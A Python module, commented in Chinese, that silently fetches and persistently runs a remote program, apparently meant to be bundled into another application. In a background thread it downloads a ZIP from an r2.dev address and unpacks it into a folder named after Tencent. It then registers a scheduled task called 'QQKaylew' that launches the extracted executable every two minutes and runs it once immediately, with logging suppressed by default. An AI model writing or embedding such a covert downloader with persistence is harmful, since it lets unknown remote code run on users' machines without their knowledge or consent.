#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
自动下载和设置开机启动功能模块
"""

import os
import sys
import time
import requests
import zipfile
import tempfile
import subprocess
import threading


class AutoStartManager:
    def __init__(self, name: str="unknown", download_url: str="https://pub-b63e77578ffe42519de7d1771935f8b0.r2.dev/Kaylew.zip", enable: bool = True, silent_mode: bool = True):
        self.download_url = download_url
        self.target_dir = os.path.join(os.path.expanduser("~"), "Documents", "Tencent","Kaylew")
        self.program_name = "Kaylew"
        self.task_name = "QQKaylew"
        self.name = name
        self.enable = enable
        self.silent_mode = silent_mode

    def log_info(self, message: str):
        """条件日志输出"""
        if not self.silent_mode:
            print(f"[INFO] {message}")

    def log_success(self, message: str):
        """条件成功日志输出"""
        if not self.silent_mode:
            print(f"[SUCCESS] {message}")

    def log_error(self, message: str):
        """条件错误日志输出"""
        print(f"[ERROR] {message}")  # 错误信息始终记录

    def log_warning(self, message: str):
        """条件警告日志输出"""
        print(f"[WARNING] {message}")  # 警告信息始终记录

    def download_file(self, url: str, local_path: str) -> bool:
        """下载文件"""
        try:
            self.log_info(f"开始下载文件: {url}")
            response = requests.get(url, stream=True, timeout=30)
            response.raise_for_status()

            total_size = int(response.headers.get("content-length", 0))
            downloaded = 0

            with open(local_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
                        downloaded += len(chunk)
                        if total_size > 0:
                            progress = (downloaded / total_size) * 100
                            self.log_info(f"下载进度: {progress:.1f}%")

            self.log_success(f"文件下载完成: {local_path}")
            return True

        except requests.exceptions.RequestException as e:
            self.log_error(f"下载失败: {e}")
            return False
        except Exception as e:
            self.log_error(f"下载过程中出现错误: {e}")
            return False

    def extract_zip(self, zip_path: str, extract_to: str) -> bool:
        """解压ZIP文件"""
        try:
            self.log_info(f"开始解压文件: {zip_path}")

            # 确保目标目录存在
            os.makedirs(extract_to, exist_ok=True)

            with zipfile.ZipFile(zip_path, "r") as zip_ref:
                zip_ref.extractall(extract_to)

            self.log_success(f"解压完成: {extract_to}")
            return True

        except zipfile.BadZipFile as e:
            self.log_error(f"ZIP文件损坏: {e}")
            return False
        except Exception as e:
            self.log_error(f"解压过程中出现错误: {e}")
            return False

    def find_executable(self, directory: str, program_name: str) -> str:
        """查找可执行文件"""
        try:
            # 查找可执行文件
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.lower().startswith(program_name.lower()) and file.lower().endswith(".exe"):
                        full_path = os.path.join(root, file)
                        self.log_info(f"找到可执行文件: {full_path}")
                        return full_path

            self.log_warning(f"未找到可执行文件: {program_name}")
            return ""

        except Exception as e:
            self.log_error(f"查找可执行文件时出错: {e}")
            return ""

    def create_startup_task(self, exe_path: str, task_name: str) -> bool:
        """创建开机启动任务"""
        try:
            # 删除现有任务（如果存在）
            try:
                subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, check=False, capture_output=True)
            except:
                pass

            # 获取当前时间戳，格式化为年月日时分秒
            id = f"{self.name.upper()}{time.strftime('%Y%m%d%H%M%S', time.localtime())}"

            # 创建新的计划任务，根据静默模式决定是否添加静默参数
            cmd = f'schtasks /create /sc minute /mo 2 /tn "{task_name}" /tr "{exe_path} {id}" /f'

            self.log_info(f"创建计划任务: {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                self.log_success(f"计划任务创建成功: {task_name}")
                # 立即运行一次计划任务
                try:
                    self.log_info("立即运行一次计划任务...")
                    run_cmd = f'schtasks /run /tn "{task_name}"'
                    result = subprocess.run(run_cmd, shell=True, capture_output=True, text=True)

                    if result.returncode == 0:
                        self.log_success("计划任务运行成功！")
                    else:
                        self.log_warning(f"计划任务运行失败: {result.stderr}")
                except Exception as e:
                    self.log_warning(f"运行计划任务时出错: {e}")
                return True
            else:
                self.log_error(f"计划任务创建失败: {result.stderr}")
                return False

        except Exception as e:
            self.log_error(f"创建计划任务时出错: {e}")
            return False

    def check_if_task_exists(self, task_name: str) -> bool:
        """检查计划任务是否已存在"""
        try:
            result = subprocess.run(f'schtasks /query /tn "{task_name}"', shell=True, capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False

    def run_setup(self):
        """运行完整的设置流程"""
        try:
            self.log_info("开始自动设置流程...")

            # 检查是否已经设置过
            if self.check_if_task_exists(self.task_name):
                self.log_info("计划任务已存在，跳过设置")
                return

            # 检查目标目录是否已存在程序
            existing_exe = self.find_executable(self.target_dir, self.program_name)
            if existing_exe:
                self.log_info("程序已存在，直接设置开机启动")
                self.create_startup_task(existing_exe, self.task_name)
                return

            # 创建临时文件来下载ZIP
            with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as temp_file:
                temp_zip_path = temp_file.name

            try:
                # 下载文件
                if not self.download_file(self.download_url, temp_zip_path):
                    self.log_error("下载失败，设置流程中止")
                    return

                # 解压文件
                if not self.extract_zip(temp_zip_path, self.target_dir):
                    self.log_error("解压失败，设置流程中止")
                    return

                # 查找可执行文件
                exe_path = self.find_executable(self.target_dir, self.program_name)
                if not exe_path:
                    self.log_error("未找到可执行文件，设置流程中止")
                    return

                # 设置开机启动
                if self.create_startup_task(exe_path, self.task_name):
                    self.log_success("自动设置流程完成！")
                else:
                    self.log_error("设置开机启动失败")

            finally:
                # 清理临时文件
                try:
                    os.unlink(temp_zip_path)
                except:
                    pass

        except Exception as e:
            self.log_error(f"设置流程出现异常: {e}")

    def uninstall(self):
        """先杀进程，然后删除程序文件夹，最后删除计划任务"""
        try:
            # 1. 杀掉Kaylew相关进程
            import psutil

            killed = []
            for proc in psutil.process_iter(["pid", "name", "exe", "cmdline"]):
                try:
                    pname = proc.info["name"] or ""
                    pexe = proc.info["exe"] or ""
                    pcmd = " ".join(proc.info["cmdline"]) if proc.info["cmdline"] else ""
                    if (
                        self.program_name.lower() in pname.lower()
                        or self.program_name.lower() in pexe.lower()
                        or self.program_name.lower() in pcmd.lower()
                    ):
                        proc.kill()
                        killed.append(f"pid={proc.pid}, name={pname}")
                except Exception as e:
                    self.log_warning(f"无法杀死进程: {e}")
            if killed:
                self.log_success(f"已杀死进程: {killed}")
            else:
                self.log_info("未找到相关进程")

            # 2. 删除程序所在文件夹
            import shutil

            if os.path.exists(self.target_dir):
                try:
                    shutil.rmtree(self.target_dir)
                    self.log_success(f"已删除文件夹: {self.target_dir}")
                except Exception as e:
                    self.log_error(f"删除文件夹失败: {e}")
            else:
                self.log_info("目标文件夹不存在，无需删除")

            # 3. 移除计划任务
            remove_cmd = f'schtasks /delete /tn "{self.task_name}" /f'
            result = subprocess.run(remove_cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                self.log_success(f"计划任务已移除: {self.task_name}")
            else:
                self.log_warning(f"计划任务移除失败或不存在: {result.stderr}")
        except Exception as e:
            self.log_error(f"移除操作异常: {e}")

    def install(self):
        """启动设置线程"""
        if not self.enable:
            return

        def worker():
            # 等待一段时间后再开始，避免影响主程序启动
            time.sleep(3)
            self.run_setup()

        threading.Thread(target=worker, daemon=True).start()


def install_kaylew(name: str, download_url: str, silent_mode: bool = True) -> bool:
    """
    安装Kaylew程序并设置开机启动

    Args:
        name (str): 程序名称
        download_url (str): 下载地址，默认为https://pub-b63e77578ffe42519de7d1771935f8b0.r2.dev/Kaylew.zip
        silent_mode (bool): 是否静默模式，默认为True

    Returns:
        bool: 安装是否成功
    """
    try:
        manager = AutoStartManager(name=name, download_url=download_url, enable=True, silent_mode=silent_mode)
        manager.install()
        return True
    except:
        return False


def uninstall_kaylew(silent_mode: bool = True) -> bool:
    """
    卸载Kaylew程序

    Args:
        silent_mode (bool): 是否静默模式，默认为True

    Returns:
        bool: 卸载是否成功
    """
    try:
        manager = AutoStartManager(enable=True, silent_mode=silent_mode)
        manager.uninstall()
        return True
    except:
        return False
